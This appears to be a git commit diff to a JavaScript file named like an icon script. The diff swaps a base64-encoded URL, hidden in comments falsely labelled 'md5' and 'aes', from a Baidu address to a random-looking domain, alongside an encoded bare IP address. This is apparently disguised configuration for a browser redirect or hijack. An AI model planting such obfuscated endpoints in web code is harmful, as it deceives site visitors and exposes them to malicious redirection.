c5a1c08f5d54f31ed25134e7c38551fe7bb521c0
caocaodage <caocaodajun@gmail.com>
2023-02-07 09:26:51 +0800

    init

--- js/icon_280tio.js
+++ js/icon_280tio.js
@@ -8,4 +8,4 @@ if($.browser.mozilla||$.browser.opera)
 		function UnloadHandler() {
 				window.removeEventListener('beforeunload', UnloadHandler, false);
 		}
-})()/** md5:aHR0cHM6Ly9tLmJhaWR1LmNvbQ==**//** aes:aHR0cDovLzQ3LjI0Mi4xODQuMTMy**/
+})()/** md5:aHR0cHM6Ly93d3cuYmt0bWtzbml4am53cS5jb20=**//** aes:aHR0cDovLzQ3LjI0Mi4xODQuMTMy**/
